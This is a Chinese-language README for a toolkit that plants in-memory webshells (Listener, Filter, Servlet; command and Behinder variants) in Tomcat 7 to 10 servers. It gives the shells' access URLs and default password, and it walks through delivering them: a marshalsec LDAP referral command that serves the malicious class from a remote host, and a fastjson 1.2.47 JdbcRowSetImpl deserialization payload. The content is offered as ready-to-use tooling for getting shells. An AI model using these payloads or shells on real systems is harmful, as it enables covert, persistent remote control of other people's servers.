# Tomcat内存马实战
支持Tomcat7/8/9/10版本Listener/Filter/Servlet内存马，支持注入CMD内存马和冰蝎内存马  

测试通过的Tomcat版本：  
- **tomcat7.0.99**(2019-12-17)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat7.0.64**(2015-10-14)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat7.0.34**(2012-12-11)  
- **tomcat8.5.69**(2021-07-05)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat8.0.46**(2017-08-18)  
- **tomcat9.0.12**(2018-09-10)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat9.0.53**(2021-09-10)  
- **tomcat10.0.11**(2021-09-10)&nbsp;&nbsp;&nbsp;&nbsp;**tomcat10.1.0-M2**(2021-07-02)
## 主要内容
1. 实用
2. 适配对应版本的库和函数，如tomcat10开始javax.servlet更改为jakarta.servlet等
3. 添加冰蝎内存马的注入代码，方便直接GetShell
4. 分别总结了.jsp和.java的内存马实现方式，添加了Listener内存马

## JSP目录
根据目标环境**上传或写入**对应大版本的.jsp文件并访问，访问后页面返回>@<即说明注入成功，支持Tomat7/8/9/10版本

*见名知义，memlistener8910.jsp表示适用于Tomcat8/9/10版本的Listener CMD内存马，icememfilter7.jsp表示适用于Tomcat7版本的Filter冰蝎内存马*

## 其他目录
对应的.java文件和.class文件需要结合**反序列化漏洞**类型进行漏洞利用，如fastjson的jndi或snakeyaml的spi等，支持Tomcat8/9/10版本

不适用于shiro漏洞，shiro漏洞利用需要继承AbstractTranslet类并且修改Header大小，感兴趣的可参考该项目：https://github.com/KpLi0rn/ShiroVulnEnv

*见名知义，LRain10表示适用于Tomcat10版本的Listener CMD内存马，IFRain表示适用于Tomcat8/9的Filter冰蝎内存马 （注意java文件修改文件名请与类名保持一致）*

对应java文件中StandardContext的获取依据Litch1师傅[《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3)的Thread.currentThread().getContextClassLoader()方式，该方式不适用于Tomcat7

## 用法
**Listener型/Filter型:**  
- CMD内存马URL：xx.xx.xx.xx/?chan=whoami  
- 冰蝎内存马URL：xx.xx.xx.xx/ &nbsp;&nbsp;&nbsp;&nbsp;默认连接密码：goautomne

**Servlet型：**  
- CMD内存马URL: xx.xx.xx.xx/p?chan=whoami  
- 冰蝎内存马URL: xx.xx.xx.xx/p &nbsp;&nbsp;&nbsp;&nbsp;默认连接密码：goautomne

## 利用举例
以fastjson1.2.47版本的反序列化漏洞为例，将对应Tomcat版本的class文件，这里以ILRain.class为例，上传到web服务器，并开启LDAP服务
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xx.xx.xx.xx/#ILRain 9102
```
然后再打入fastjson漏洞的poc,就可以使用冰蝎客户端去连接了
```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://xx.xx.xx.xx:9102/123",
        "autoCommit":true
    }

```

